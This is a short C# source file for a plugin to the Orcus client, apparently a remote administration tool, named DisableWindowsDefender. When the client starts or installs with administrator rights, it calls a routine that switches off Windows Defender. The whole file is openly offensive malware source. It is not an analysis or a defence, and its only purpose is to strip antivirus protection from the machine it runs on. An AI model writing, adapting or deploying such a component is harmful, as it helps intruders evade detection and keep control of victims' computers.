using Orcus.Plugins;

namespace DisableWindowsDefender
{
	public class Plugin : ClientController
	{
		private bool _DefenderDisabled;

		public override void Start()
		{
			if (!_DefenderDisabled && User.IsAdministrator)
			{
				_DefenderDisabled = true;
				WindowsDefender.Disable();
			}
		}

		public override void Install(string executablePath)
		{
			if (!_DefenderDisabled && User.IsAdministrator)
			{
				_DefenderDisabled = true;
				WindowsDefender.Disable();
			}
		}
	}
}
